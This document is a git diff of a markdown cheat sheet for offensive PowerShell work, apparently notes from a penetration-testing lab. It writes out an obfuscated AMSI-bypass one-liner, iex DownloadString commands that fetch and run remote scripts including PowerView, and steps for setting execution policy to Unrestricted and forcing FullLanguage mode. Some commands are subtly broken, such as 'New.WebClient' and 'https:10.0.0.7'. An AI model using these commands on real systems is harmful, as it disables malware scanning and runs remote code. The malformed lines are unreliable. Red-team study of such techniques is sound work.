@@ -24,17 +24,19 @@
 
 ## AMSI Bypass
 
-1. Source 1: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  
-
-2. Source 2: [reigningshells/powershell-bypasses.ps1](https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560)  
+1. Source 1: [reigningshells/powershell-bypasses.ps1](https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560)  
 &nbsp;&nbsp;&nbsp;&nbsp;- *This bypass works*  
 
-3. Test old bypass: ``sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )``  
+2. Test that `amsiinitfailed`, `amsiutils`, `invoke-mimikatz`, etc returns that it isn't the name of a cmdlet, function, etc  
+
+3. Test BURNED bypass: ``sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )``  
 &nbsp;&nbsp;&nbsp;&nbsp;- *It should have no return output*  
 
-4. Test that `amsiinitfailed` returns that it isn't the name of a cmdlet, function, etc*
+4. Right way to bypass: `iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")`  
 
-5. Right way to bypass: `iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")`
+5. Source 2: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  
+
+6. Source 3: [0gtweet - powershell.exe params](https://twitter.com/0gtweet/status/1281103918693482496)
 
 &nbsp;  
 
@@ -68,16 +70,18 @@
 
 7. `cd .\ADModule-master\ActiveDirectory`  
 
-8. `Import-Module ActiveDirectory.psd1`            //////////////////////////////////
+8. `Import-Module .\ActiveDirectory.psd1`  
 
-9. `Get-Command -Module ActiveDirectoryn   get-`  //////////////////////////////////
+9. `Get-Command -Module ActiveDirectory` should work now  
 
 &nbsp;  
 
 ## Execution Policy and Execution Context  
 
 1. `Get-ExecutionPolicy -list`  
-&nbsp;&nbsp;&nbsp;&nbsp;- *make sure only unrestricted for CurrentUser*  
+&nbsp;&nbsp;&nbsp;&nbsp;- *make sure only unrestricted for CurrentUser and LocalMachine*
+&nbsp;&nbsp;&nbsp;&nbsp;- *`Set-ExecutionPolicy -Scope <scope_name> -ExecutionPolicy Unrestricted` where <scope_name> can be CurrentUser or LocalMachine*
+&nbsp;&nbsp;&nbsp;&nbsp;- *Source: [ways to bypass powershell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)*
 
 2. `$ExecutionContext.SessionState`  
 &nbsp;&nbsp;&nbsp;&nbsp;- *Make sure LanguageMode is FullLanguage or do `-set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"`*  
@@ -86,12 +90,12 @@
 
 ## PowerView  
 
-1. New PowerView: [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
-&nbsp;&nbsp;&nbsp;&nbsp;- *Copy/paste, download zip, or git clone*  
+1. New PowerView: [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)  
+&nbsp;&nbsp;&nbsp;&nbsp;- *Download zip, or git clone, or copy/paste in `notepad.exe PowerView.ps1` or by `iwr -Uri "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon/PowerView.ps1" -Outfile PowerView.ps1`*  
+&nbsp;&nbsp;&nbsp;&nbsp;- *Right way to download: `iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")`*  
 
-2. 
-
-Right way to download: `iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")`
+2. `Import-Module .\PowerView.ps1`
+&nbsp;&nbsp;&nbsp;&nbsp;- * PowerView Tips: [HarmJ0y/Cheatsheets](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf) and [BSidesCharm-PowershellSecurity](https://adsecurity.org/wp-content/uploads/2016/05/BSidesCharm-2016-PowerShellSecurity-Defending-the-Enterprise-from-the-Latest-Attack-Platform-FINAL.pdf)
 
 &nbsp;  
 
